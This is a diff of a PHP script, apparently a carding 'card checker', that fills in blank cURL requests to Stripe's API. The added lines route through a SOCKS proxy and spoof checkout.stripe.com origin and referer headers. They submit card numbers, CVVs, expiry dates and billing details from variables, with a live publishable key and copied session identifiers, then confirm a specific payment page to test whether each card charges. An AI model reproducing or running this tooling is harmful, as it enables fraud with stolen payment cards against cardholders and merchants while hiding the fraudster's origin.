@@ -71,15 +71,15 @@ $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, ' ');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept:  ',
-'accept-encoding:   ', 
-'content-type:  ',
-'origin:  ',
-'referer:  ',
+'Host: api.stripe.com',
+'accept:  application/json',
+'content-type: application/x-www-form-urlencoded ',
+'origin: https://checkout.stripe.com',
+'referer: https://checkout.stripe.com/ ',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -89,7 +89,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, '  ');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][state]='.$state.'&guid=f5bb22ad-df1b-4e9e-ba3e-80d3ae0fde185ecc1a&muid=c034e9b4-f58e-47ee-802b-c4d77dc4855372ad6a&sid=c7da2eb0-ab34-4a6a-9a30-d41fe135d9475a1e28&key=pk_live_0zkFa9UrUl37HqqvVjhvrdkh&payment_user_agent=stripe.js%2Fc7a0b9a66%3B+stripe-js-v3%2Fc7a0b9a66%3B+checkout');
 
  $result = curl_exec($ch);
  $token = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -101,7 +101,7 @@ $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); 
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, ' ');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/ppage_1IO1D7LSk038ZBy085aWErqp/confirm');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -112,18 +112,18 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-///'Host: ',
-  'Origin: ',
+  'Host: api.stripe.com',
+  'Origin: https://checkout.stripe.com',
   'Accept-Encoding: ',
-  'Referer: ',
-  'content-type: ',
+  'Referer: https://checkout.stripe.com/',
+  'content-type: application/x-www-form-urlencoded',
   'Cookie: ',
-  'accept: ',
+  'accept: application/json',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-origin',
    ));
-curl_setopt($ch, CURLOPT_POSTFIELDS,' ');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'eid=NA&payment_method='.$token.'&expected_amount=299&shipping[address][line1]='.$street.'&shipping[address][city]='.$city.'&shipping[address][country]=US&shipping[address][postal_code]='.$postcode.'&shipping[address][state]='.$state.'&shipping[name]='.$name.'+'.$last.'&key=pk_live_0zkFa9UrUl37HqqvVjhvrdkh');
   $result2 = curl_exec($ch);
  $message = trim(strip_tags(getstr($result2,'"message":"','"')));
 
